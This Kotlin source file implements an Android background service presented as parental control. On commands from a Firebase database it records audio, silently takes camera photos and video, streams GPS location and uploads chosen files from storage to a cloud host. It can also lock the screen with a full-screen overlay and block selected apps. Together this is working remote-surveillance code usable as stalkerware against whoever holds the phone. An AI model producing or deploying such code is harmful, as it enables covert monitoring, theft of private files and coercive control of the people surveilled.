package com.example

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.example.FirebaseManager.getSanitizedEmail
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.*
import java.io.File

class BackgroundDaemonService : LifecycleService() {

    companion object {
        private const val TAG = "BackgroundDaemon"
        private const val NOTIFICATION_ID = 9987
        private const val CHANNEL_ID = "parent_control_daemon_channel"

        fun start(context: Context, email: String) {
            val intent = Intent(context, BackgroundDaemonService::class.java).apply {
                putExtra("email", email)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, BackgroundDaemonService::class.java)
            context.stopService(intent)
        }
    }

    private var activeEmail: String = ""
    private var isServiceInitialized = false

    // Controllers
    private lateinit var audioRecorder: AudioRecorder
    private lateinit var locationTracker: LocationTracker
    
    // Core database endpoints
    private var databaseRef: DatabaseReference? = null
    private var valueListener: ValueEventListener? = null
    
    // Storage watcher listener
    private var storageUploadListener: ValueEventListener? = null
    private var storageRef: DatabaseReference? = null

    // Background jobs
    private var daemonJob: Job? = null
    private var wakeLock: PowerManager.WakeLock? = null

    // Block state holders
    private var isProcessingMic = false
    private var isProcessingImage = false
    private var isProcessingVideo = false
    private var blockedPackagesMap = mapOf<String, String>()
    private var isAppBlockedActive = false
    private var currentBlockedAppName = ""
    private var screenBlockActive = false

    // Window overlay block view
    private var systemOverlayView: FrameLayout? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "BackgroundDaemonService Created")
        audioRecorder = AudioRecorder(this)
        locationTracker = LocationTracker(this)
        
        // Take a wake lock to ensure the OS does not suspend CPU execution
        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
        wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ParentControl::DaemonLock")?.apply {
            acquire(30 * 60 * 1000L /*30 minutes backup*/)
        }

        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        
        val email = intent?.getStringExtra("email") ?: activeEmail
        activeEmail = email
        
        // Always call startForeground first in onStartCommand to satisfy Android OS requirements
        startForegroundNotification(email)
        
        if (email.isNotEmpty() && (!isServiceInitialized || email != activeEmail)) {
            initializeDaemonLogic(email)
            isServiceInitialized = true
        }

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Parent Monitoring Stream",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "Synchronizes screen block commands, remote audio, camera controls, and real-time GPS locations"
                setShowBadge(false)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun startForegroundNotification(email: String) {
        val displayEmail = if (email.isNotEmpty()) email else "Unregistered"
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Parent's Control Active")
            .setContentText("Connected to supervisor framework for client: $displayEmail")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .build()
        
        // Declaring appropriate foreground types for API 34+ if granted
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
            
            try {
                startForeground(NOTIFICATION_ID, notification, serviceType)
            } catch (e: Exception) {
                Log.e(TAG, "Error starting foreground service with types: ${e.message}. Falling back to metadata-driven startForeground.")
                try {
                    // Fallback to dataSync FGS type explicitly which only needs normal permission
                    startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                } catch (err: Exception) {
                    Log.e(TAG, "Fatal fallback startForeground error: ${err.message}")
                }
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun initializeDaemonLogic(email: String) {
        // Clean up any past database monitors
        cleanupDatabaseListeners()
        daemonJob?.cancel()

        // Sync Device Status and start polling
        FirebaseManager.initFirebase(this)
        val sanitized = getSanitizedEmail(email)
        
        // 1. Listen for blocking apps list & Commands
        syncBlockedPackages(sanitized)
        startFirebaseCommandListener(sanitized)
        startFirebaseStorageUploadsListener(sanitized)

        // 2. Continuous Background Polling Loop for blocked apps & overlays
        daemonJob = lifecycleScope.launch(Dispatchers.Default) {
            while (isActive) {
                delay(600)
                try {
                    val fgPackage = getForegroundPackageName(this@BackgroundDaemonService)
                    withContext(Dispatchers.Main) {
                        if (fgPackage != null && fgPackage != packageName) {
                            if (blockedPackagesMap.containsKey(fgPackage)) {
                                isAppBlockedActive = true
                                currentBlockedAppName = blockedPackagesMap[fgPackage] ?: "Selected App"
                            } else {
                                isAppBlockedActive = false
                            }
                        } else {
                            isAppBlockedActive = false
                        }
                        
                        // Decide Overlay Visibility
                        val showOverlay = screenBlockActive || isAppBlockedActive
                        val overlayMessage = if (isAppBlockedActive) {
                            "The Device Supervisor has temporarily restricted access to '$currentBlockedAppName'. Please engage in constructive studies or query your system administrator."
                        } else {
                            "This device is currently locked. The System Administrator has enabled remote security blocking on this terminal."
                        }
                        
                        updateSystemOverlayBlock(showOverlay, overlayMessage, activeEmail)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in daemon loop execution: ${e.message}")
                }
            }
        }
    }

    private fun syncBlockedPackages(sanitized: String) {
        val ref = FirebaseManager.getRef("Devices").child(sanitized).child("InstalledApps")
        ref.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val tempBlocked = mutableMapOf<String, String>()
                if (snapshot.exists()) {
                    for (child in snapshot.children) {
                        val pName = child.child("packageName").value?.toString() ?: continue
                        val appLabel = child.child("appName").value?.toString() ?: "App"
                        val state = child.child("blocked").value?.toString() ?: "off"
                        if (state == "on") {
                            tempBlocked[pName] = appLabel
                        }
                    }
                }
                blockedPackagesMap = tempBlocked
                Log.d(TAG, "Synced blocked apps background package list: $blockedPackagesMap")
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun startFirebaseCommandListener(sanitized: String) {
        val ref = FirebaseManager.getRef("Command").child(sanitized)
        databaseRef = ref
        
        val listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) {
                    FirebaseManager.createDefaultCommandStructure(activeEmail)
                    return
                }

                val commandState = parseCommandState(snapshot)
                Log.d(TAG, "Received Command Background: Block=${commandState.screenBlock}, Mic=${commandState.mic}")

                // Screen Block Control
                screenBlockActive = (commandState.screenBlock.lowercase() == "on")

                // Location Tracking Manager
                if (commandState.location.lowercase() == "on") {
                    manageLocationTracking(true)
                } else {
                    manageLocationTracking(false)
                }

                // Mic Recording Automation
                if (commandState.mic.lowercase() == "on" && !isProcessingMic) {
                    isProcessingMic = true
                    lifecycleScope.launch {
                        try {
                            val durationMs = parseDurationToMs(commandState.micTime)
                            val audioFile = audioRecorder.startRecording()
                            if (audioFile != null) {
                                delay(durationMs)
                                audioRecorder.stopRecording()
                                val url = CloudinaryUploader.uploadFile(audioFile, "raw")
                                FirebaseManager.submitUpload(activeEmail, url, "audio", "Mic recording duration: ${commandState.micTime}")
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Mic capture background failure: ${e.message}")
                        } finally {
                            ref.child("mic").setValue("off")
                            isProcessingMic = false
                        }
                    }
                }

                // Camera Photo Automation
                if (commandState.image.lowercase() == "on" && !isProcessingImage) {
                    isProcessingImage = true
                    lifecycleScope.launch {
                        try {
                            captureCameraHeadlessImage(
                                context = this@BackgroundDaemonService,
                                lifecycleOwner = this@BackgroundDaemonService,
                                cameraSource = commandState.imageCamera,
                                limits = commandState.imageLimits,
                                onPhotoFileReady = { file ->
                                    lifecycleScope.launch {
                                        val url = CloudinaryUploader.uploadFile(file, "image")
                                        FirebaseManager.submitUpload(activeEmail, url, "image", "Camera frame (${commandState.imageCamera}) target")
                                    }
                                },
                                onLogMsg = { Log.d(TAG, "Headless-Photo: $it") }
                            )
                        } catch (e: Exception) {
                            Log.e(TAG, "Camera photo background failure: ${e.message}")
                        } finally {
                            delay(4000)
                            ref.child("image").setValue("off")
                            isProcessingImage = false
                        }
                    }
                }

                // Camera Video Automation
                if (commandState.video.lowercase() == "on" && !isProcessingVideo) {
                    isProcessingVideo = true
                    lifecycleScope.launch {
                        try {
                            val durationMs = parseDurationToMs(commandState.videoTime)
                            captureCameraHeadlessVideo(
                                context = this@BackgroundDaemonService,
                                lifecycleOwner = this@BackgroundDaemonService,
                                cameraSource = commandState.videoCamera,
                                durationMs = durationMs,
                                onVideoFileReady = { file ->
                                    lifecycleScope.launch {
                                        val url = CloudinaryUploader.uploadFile(file, "video")
                                        FirebaseManager.submitUpload(activeEmail, url, "video", "Captured video duration: ${commandState.videoTime}")
                                    }
                                },
                                onLogMsg = { Log.d(TAG, "Headless-Video: $it") }
                            )
                        } catch (e: Exception) {
                            Log.e(TAG, "Camera video background failure: ${e.message}")
                        } finally {
                            delay(5000)
                            ref.child("video").setValue("off")
                            isProcessingVideo = false
                        }
                    }
                }

                // Notifications Dispatch Engine
                val notificationSnapshot = snapshot.child("notification")
                if (notificationSnapshot.exists()) {
                    val notifStatus = notificationSnapshot.child("status").value?.toString() ?: ""
                    
                    // Respond when status was updated to "sent" from Firebase or Supervisor Admin console!
                    if (notifStatus == "sent") {
                        val title = notificationSnapshot.child("title").value?.toString() ?: "Supervisor Alert"
                        val body = notificationSnapshot.child("body").value?.toString()
                            ?: notificationSnapshot.child("message").value?.toString()
                            ?: "A new device supervisor notification was received."
                        val photo = notificationSnapshot.child("photo").value?.toString() ?: ""
                        val action = notificationSnapshot.child("action").value?.toString() ?: ""
                        
                        // Immediately make sure to avoid repeated alerts on re-sync
                        // Mark as display completed
                        notificationSnapshot.ref.child("status").setValue("displayed")
                        
                        showLocalControlNotification(this@BackgroundDaemonService, title, body, photo, action)
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        }
        
        ref.addValueEventListener(listener)
        valueListener = listener
    }

    private fun startFirebaseStorageUploadsListener(sanitized: String) {
        val ref = FirebaseManager.getRef("Devices").child(sanitized).child("StorageStructure")
        storageRef = ref
        
        val listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (!snapshot.exists()) return
                for (child in snapshot.children) {
                    val uploadValue = child.child("upload").value?.toString() ?: "off"
                    if (uploadValue == "on") {
                        val path = child.child("path").value?.toString() ?: continue
                        val isDir = child.child("isDir").value as? Boolean ?: false
                        val key = child.key ?: continue
                        
                        if (!isDir) {
                            val file = File(path)
                            if (file.exists() && file.isFile) {
                                ref.child(key).child("upload").setValue("pending")
                                Log.d(TAG, "Storage Upload triggered background: uploading file path: $path")
                                
                                CoroutineScope(Dispatchers.IO).launch {
                                    try {
                                        val fallbackType = if (file.name.endsWith(".jpg", true) || file.name.endsWith(".png", true)) "image" else "raw"
                                        val url = CloudinaryUploader.uploadFile(file, fallbackType)
                                        withContext(Dispatchers.Main) {
                                            ref.child(key).child("upload").setValue("done")
                                            ref.child(key).child("downloadUrl").setValue(url)
                                            FirebaseManager.submitUpload(activeEmail, url, "file_transfer", "Uploaded storage file: ${file.name}")
                                        }
                                    } catch (e: Exception) {
                                        withContext(Dispatchers.Main) {
                                            ref.child(key).child("upload").setValue("failed")
                                            Log.e(TAG, "File background transfer failed: ${e.message}")
                                        }
                                    }
                                }
                            } else {
                                ref.child(key).child("upload").setValue("file_not_found")
                            }
                        }
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        }
        ref.addValueEventListener(listener)
        storageUploadListener = listener
    }

    private fun updateSystemOverlayBlock(show: Boolean, message: String, activeEmail: String) {
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        if (show) {
            if (!Settings.canDrawOverlays(this)) {
                Log.w(TAG, "Cannot show system overlay block yet: missing permission")
                return
            }
            if (systemOverlayView == null) {
                val container = FrameLayout(this).apply {
                    setBackgroundColor(android.graphics.Color.parseColor("#121212")) // slate lock color
                    isClickable = true
                    isFocusable = true
                }

                val linearLayout = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = android.view.Gravity.CENTER
                    setPadding(48, 48, 48, 48)
                }

                // Lock graphic image
                val iconView = ImageView(this).apply {
                    setImageResource(android.R.drawable.ic_secure)
                    setColorFilter(android.graphics.Color.parseColor("#E53935")) // Red Alert
                    layoutParams = LinearLayout.LayoutParams(160, 160).apply {
                        bottomMargin = 48
                    }
                }
                linearLayout.addView(iconView)

                // Restricted Headline
                val titleView = TextView(this).apply {
                    text = "No Access Allowed!"
                    textSize = 24f
                    setTextColor(android.graphics.Color.WHITE)
                    setTypeface(null, android.graphics.Typeface.BOLD)
                    gravity = android.view.Gravity.CENTER
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.WRAP_CONTENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    ).apply {
                        bottomMargin = 24
                    }
                }
                linearLayout.addView(titleView)

                // Custom dynamic blocking alert instructions label
                val descView = TextView(this).apply {
                    text = message
                    textSize = 15f
                    setTextColor(android.graphics.Color.parseColor("#ECEFF1"))
                    gravity = android.view.Gravity.CENTER
                    layoutParams = LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    ).apply {
                        bottomMargin = 48
                    }
                }
                linearLayout.addView(descView)

                // Subtitle tracking label
                val labelView = TextView(this).apply {
                    text = "System Sync Registered: $activeEmail"
                    textSize = 11f
                    setTextColor(android.graphics.Color.parseColor("#FFEB3B"))
                    setTypeface(null, android.graphics.Typeface.BOLD)
                    gravity = android.view.Gravity.CENTER
                }
                linearLayout.addView(labelView)

                container.addView(linearLayout, FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.WRAP_CONTENT,
                    android.view.Gravity.CENTER
                ))

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    } else {
                        @Suppress("DEPRECATION")
                        WindowManager.LayoutParams.TYPE_PHONE
                    },
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            WindowManager.LayoutParams.FLAG_FULLSCREEN or
                            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                )

                try {
                    windowManager.addView(container, params)
                    systemOverlayView = container
                    Log.d(TAG, "Drawn full screen blocking window overlay manager successfully!")
                } catch (e: Exception) {
                    Log.e(TAG, "Error drawing WindowManager system alert layout: ${e.message}")
                }
            } else {
                try {
                    // Update content strings in place
                    val linearLayout = systemOverlayView?.getChildAt(0) as? LinearLayout
                    val descView = linearLayout?.getChildAt(2) as? TextView
                    descView?.text = message
                    val labelView = linearLayout?.getChildAt(3) as? TextView
                    labelView?.text = "System Sync Registered: $activeEmail"
                } catch (e: Exception) {
                    Log.e(TAG, "Fail modifying existing block display overlays: ${e.message}")
                }
            }
        } else {
            if (systemOverlayView != null) {
                try {
                    windowManager.removeView(systemOverlayView)
                    Log.d(TAG, "Successfully wiped active overlays.")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to remove block overlay from window layout: ${e.message}")
                } finally {
                    systemOverlayView = null
                }
            }
        }
    }

    private var activeLocationJob: Job? = null
    
    private fun manageLocationTracking(start: Boolean) {
        if (start) {
            if (activeLocationJob != null) return // already running
            activeLocationJob = lifecycleScope.launch(Dispatchers.IO) {
                try {
                    locationTracker.getLocationFlow(15000L).collect { location ->
                        // Put new location coordinates into firebase
                        val sanitized = getSanitizedEmail(activeEmail)
                        val ref = FirebaseManager.getRef("Location").child(sanitized)
                        val data = mapOf(
                            "latitude" to location.latitude,
                            "longitude" to location.longitude,
                            "timestamp" to System.currentTimeMillis()
                        )
                        ref.setValue(data)
                        Log.d(TAG, "Background Location updated to cloud metrics segment.")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Location streaming job failure: ${e.message}")
                }
            }
        } else {
            activeLocationJob?.cancel()
            activeLocationJob = null
        }
    }

    private fun getForegroundPackageName(context: Context): String? {
        val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager ?: return null
        val time = System.currentTimeMillis()
        val stats = usageStatsManager.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, time - 1000 * 15, time)
        if (stats != null && stats.isNotEmpty()) {
            val sorted = stats.sortedByDescending { it.lastTimeUsed }
            return sorted.firstOrNull()?.packageName
        }
        return null
    }

    private fun parseDurationToMs(timeStr: String): Long {
        val seconds = timeStr.filter { it.isDigit() }.toLongOrNull() ?: 10L
        return seconds * 1000L
    }

    private fun showLocalControlNotification(context: Context, title: String, message: String, photoUrl: String, actionUrl: String) {
        val channelId = "parents_control_alerts"
        val channelName = "Parents Control Alerts"
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_HIGH).apply {
                description = "Alerts and messages sent by parents"
                enableLights(true)
                lightColor = android.graphics.Color.RED
                enableVibration(true)
            }
            notificationManager.createNotificationChannel(channel)
        }

        val parsedActionIntent = if (actionUrl.isNotEmpty()) {
            try {
                Intent(Intent.ACTION_VIEW, Uri.parse(actionUrl)).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
            } catch (e: Exception) {
                null
            }
        } else {
            null
        }

        val pendingIntent = if (parsedActionIntent != null) {
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            } else {
                android.app.PendingIntent.FLAG_UPDATE_CURRENT
            }
            android.app.PendingIntent.getActivity(context, 233, parsedActionIntent, flags)
        } else {
            null
        }

        val builder = NotificationCompat.Builder(context, channelId)
            .setContentTitle(title)
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .setDefaults(Notification.DEFAULT_ALL)
            
        if (pendingIntent != null) {
            builder.setContentIntent(pendingIntent)
        }

        // Display with unique ID
        notificationManager.notify(System.currentTimeMillis().toInt(), builder.build())
    }

    private fun parseCommandState(snapshot: DataSnapshot): CommandState {
        return CommandState(
            mic = snapshot.child("mic").value?.toString() ?: "off",
            micTime = snapshot.child("micTime").value?.toString() ?: "10",
            image = snapshot.child("image").value?.toString() ?: "off",
            imageCamera = snapshot.child("imageCamera").value?.toString() ?: "back",
            imageLimits = snapshot.child("imageLimits").value?.toString()?.toIntOrNull() ?: 1,
            video = snapshot.child("video").value?.toString() ?: "off",
            videoCamera = snapshot.child("videoCamera").value?.toString() ?: "back",
            videoTime = snapshot.child("videoTime").value?.toString() ?: "10",
            location = snapshot.child("location").value?.toString() ?: "off",
            screenBlock = snapshot.child("screenBlock").value?.toString() ?: "off"
        )
    }

    private fun cleanupDatabaseListeners() {
        try {
            databaseRef?.let { ref ->
                valueListener?.let { list ->
                    ref.removeEventListener(list)
                }
            }
        } catch (e: Exception) {}
        databaseRef = null
        valueListener = null

        try {
            storageRef?.let { ref ->
                storageUploadListener?.let { list ->
                    ref.removeEventListener(list)
                }
            }
        } catch (e: Exception) {}
        storageRef = null
        storageUploadListener = null
    }

    override fun onDestroy() {
        cleanupDatabaseListeners()
        daemonJob?.cancel()
        activeLocationJob?.cancel()
        updateSystemOverlayBlock(false, "", "")
        
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (e: Exception) {}
        
        Log.d(TAG, "BackgroundDaemonService Destroyed")
        super.onDestroy()
    }
}
